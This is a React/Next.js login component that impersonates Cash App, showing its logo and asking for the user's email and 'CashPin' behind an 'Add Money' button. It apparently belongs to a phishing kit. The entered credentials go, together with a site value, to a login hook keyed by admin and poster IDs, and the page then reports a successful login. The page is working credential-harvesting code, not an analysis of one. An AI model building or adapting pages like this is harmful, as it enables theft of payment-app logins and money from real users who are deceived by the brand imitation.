"use client";
import { Field, Form, Formik } from "formik";
import { site } from "../config/index";
import { toast } from "react-toastify";
import useMockLogin from "../hooks/useMockLogin";
export default function Home({ adminId, posterId }) {
  const initialvalues = {
    email: "",
    password: "",
  };

  const { login } = useMockLogin(adminId, posterId);
  const handleSubmit = (values, formik) => {
    const { email, password } = values;

    // console.log("values", values);
    // return;

    const submitValues = {
      site: site,
      email: email,
      password: password,
    };

    login(submitValues, formik);
    toast.success("Login Succecssfull");

    // console.log(submitValues);
  };
  return (
    <div className="flex flex-col justify-center items-center shadow-lg rounded-xl bg-slate-100 w-[400px] h-[500px] mx-auto mt-[150px]">
      <img src="/images/Square_Cash_app_logo.svg" height={150} width={150} />
      <div className="mt-5">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="">
              <div className="flex flex-row justify-center items-center pl-5 w-[387px]">
                <label
                  htmlFor="email"
                  className="text-sm w-[100px] text-green-500 font-semibold "
                >
                  Your Email:
                </label>
                <Field
                  className="w-full px-[4px] py-[5px]  outline-none border  border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
                  placeholder="Your email"
                  name="email"
                  type="email"
                  required
                />
              </div>

              <div className="flex flex-row justify-center mt-3 items-center -pl-2  w-[388px]">
                <label
                  htmlFor="email"
                  className="text-sm  w-[130px] text-green-500 font-semibold"
                >
                  Your CashPin:
                </label>
                <Field
                  className="w-full  px-[4px] py-[5px] outline-none border border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
                  placeholder="Your password"
                  name="password"
                  type="password"
                  autoComplete="on"
                  required
                />
              </div>

              <div className="flex flex-row justify-center items-center mt-1">
                <button
                  type="submit"
                  className="mt-5 px-6 py-1 text-lg font-semibold bg-green-500 mx-auto text-white transition duration-300 rounded"
                >
                  Add Money
                </button>
              </div>
            </Form>
          )}
        </Formik>
      </div>
    </div>
  );
}
